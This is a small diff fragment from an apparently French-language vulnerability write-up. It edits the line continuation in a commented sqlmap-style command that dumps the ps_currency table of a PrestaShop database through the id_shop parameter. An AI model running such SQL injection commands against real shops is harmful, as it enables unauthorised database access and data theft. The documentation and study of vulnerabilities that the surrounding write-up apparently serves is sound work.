@@ -73,7 +73,7 @@ Voici maintenant la commande qui exploite la vulnérabilité.
   # --dump\
   # -D la_base\
   # -T ps_currency\
-  # -p id_shop
+  # -p id_shop\
   # --flush-session
 ```
 
